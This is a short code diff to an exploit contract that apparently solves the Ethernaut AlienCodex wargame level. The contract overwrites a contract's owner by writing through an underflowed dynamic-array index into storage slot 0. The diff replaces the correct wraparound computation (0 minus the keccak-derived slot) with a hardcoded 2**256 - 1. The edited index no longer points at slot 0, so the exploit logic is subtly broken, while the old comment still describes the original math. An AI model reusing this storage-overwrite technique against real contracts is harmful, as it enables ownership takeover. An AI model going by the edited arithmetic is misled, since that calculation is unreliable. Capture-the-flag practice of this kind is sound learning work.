@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.10;
+pragma solidity ^0.5.0;
 
 import "../src/AlienCodex/AlienCodex.sol";
 
@@ -31,11 +31,11 @@ contract AlienCodexHack {
          */
 
         uint256 h = uint256(keccak256(abi.encode(uint256(1))));
-        uint256 i;
-        unchecked {
-            // h + i = 0 = 2**256
-            i -= h;
-        }
+        uint256 i = 2**256 - 1;
+        // unchecked {
+        //     // h + i = 0 = 2**256
+        //     i -= h;
+        // }
 
         alienCodex.revise(i, bytes32(uint256(uint160(newOwner))));
 
